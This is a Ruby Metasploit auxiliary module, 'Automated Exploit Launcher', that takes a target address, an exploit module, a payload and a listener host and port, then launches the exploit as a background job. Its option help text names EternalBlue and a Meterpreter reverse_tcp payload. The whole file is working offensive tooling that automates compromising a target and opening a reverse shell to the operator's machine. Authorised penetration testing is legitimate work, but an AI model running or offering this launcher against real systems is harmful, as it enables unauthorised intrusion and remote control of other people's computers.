##
# Automated Exploit Launcher
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Automated Exploit Launcher',
        'Description' => 'Automatically launches a chosen exploit with a specified payload against a target',
        'Author'      => ['Farid Mirzazada'],
        'License'     => MSF_LICENSE
      )
    )

    register_options(
      [
        Opt::RHOST(),
        OptString.new('EXPLOIT', [true, 'Exploit module to use (e.g. exploit/windows/smb/ms17_010_eternalblue)']),
        OptString.new('PAYLOAD', [true, 'Payload module to use (e.g. windows/x64/meterpreter/reverse_tcp)']),
        OptAddress.new('LHOST', [true, 'Local IP address']),
        OptInt.new('LPORT', [true, 'Local port'])
      ]
    )
  end

  def run
    rhost   = datastore['RHOST']
    exploit_name = datastore['EXPLOIT']
    payload_name = datastore['PAYLOAD']
    lhost   = datastore['LHOST']
    lport   = datastore['LPORT']

    print_status("Launching exploit #{exploit_name} against #{rhost} with payload #{payload_name}")

    begin
      # Create exploit module
      exploit = framework.exploits.create(exploit_name)
      fail_with(Failure::BadConfig, 'Invalid exploit module') unless exploit

      # Configure exploit options
      exploit.datastore['RHOSTS'] = rhost
      exploit.datastore['LHOST']  = lhost
      exploit.datastore['LPORT']  = lport

      # Create payload module
      payload = framework.payloads.create(payload_name)
      fail_with(Failure::BadConfig, 'Invalid payload module') unless payload

      # Configure payload options
      payload.datastore['LHOST'] = lhost
      payload.datastore['LPORT'] = lport

      print_status('Running exploit...')

      exploit.exploit_simple(
        'Payload' => payload,
        'Target'  => exploit.targets.first,
        'RunAsJob'=> true
      )

    rescue ::Exception => e
      print_error("Exploit failed: #{e.message}")
    end
  end
end
